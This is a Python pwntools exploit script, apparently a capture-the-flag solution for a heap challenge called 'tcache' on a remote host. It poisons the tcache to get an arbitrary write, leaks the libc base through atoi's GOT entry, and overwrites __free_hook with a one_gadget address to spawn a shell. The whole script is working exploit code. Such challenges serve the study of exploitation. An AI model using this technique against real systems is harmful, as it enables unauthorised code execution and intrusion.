from pwn import *
import time

ip = "140.110.112.77"
port = 4007

# r = process("./tcache")
r = remote(ip, port)

def Say(data):
    r.sendlineafter(">", "1")
    time.sleep(0.1)
    r.send(data.ljust(0x18, b'\x00'))

def Print():
    r.sendlineafter(">", "2")

def Burn():
    r.sendlineafter(">", "3")

context.arch = "amd64"

atoi_got = 0x403fe8
ptr = 0x404050

def Write(addr, data):
    Say(b'')
    Burn()
    Burn()
    Burn()
    Burn()
    Say(p64(addr))
    Say(b'')
    Say(data)

Write(ptr, flat(atoi_got))
Print()
r.recvline()
libc = u64(r.recv()[:6].ljust(8, b'\x00')) - 0x40680
log.info(hex(libc))
r.sendline("")

one = libc + 0x4f322
free_hook = libc + 0x3ed8e8
Write(free_hook, p64(one))
Burn()

r.interactive()
